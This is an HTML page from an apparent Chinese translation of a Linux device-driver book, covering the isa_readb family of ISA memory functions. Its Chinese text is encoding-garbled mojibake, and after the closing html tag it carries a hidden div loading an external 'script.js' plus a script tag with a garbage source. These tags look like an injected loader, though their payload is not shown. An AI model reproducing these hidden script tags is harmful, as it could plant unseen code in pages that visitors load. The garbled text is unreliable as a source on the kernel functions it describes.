<p>¿´Ò»ÏÂÄÚºËÔ´Âë»áÕ¹ÏÖÁíÒ»Ì×º¯Êı, ÓĞÈç isa_readb µÄÃû×Ó. Êµ¼ÊÉÏ, Ã¿¸ö¸Õ²ÅÃèÊöµÄº¯Êı¶¼ÓĞÒ»¸ö isa_ ¶ÔµÈÌå. ÕâĞ©º¯ÊıÌá¹©¶Ô ISA ÄÚ´æµÄ´æÈ¡²»ĞèÒªÒ»¸öµ¥¶ÀµÄ ioremap ²½Öè. µ«ÊÇ, À´×ÔÄÚºË¿ª·¢ÕßµÄ»°, ÊÇÕâĞ©º¯Êı´òËãÓÃÀ´×÷ÎªÔİÊ±µÄÇı¶¯ÒÆÖ²¸¨Öú, ²¢ÇÒËü¿ÉÄÜ½«À´ÏûÊ§. Òò´Ë, ÄãÓ¦µ±±ÜÃâÊ¹ÓÃËüÃÇ.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch09s03.html">ÉÏÒ»Ò³</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch09.html">ÉÏÒ»¼¶</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch09s05.html">ÏÂÒ»Ò³</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">9.3.&#160;Ò»¸ö I/O ¶Ë¿ÚÀı×Ó&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ÆğÊ¼Ò³</a></td>
<td width="40%" align="right" valign="top">&#160;9.5.&#160;¿ìËÙ²Î¿¼</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=ÿÊG‡ Â2BÆÄïşòİ”xºı8üäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İšŠPpÈd></script>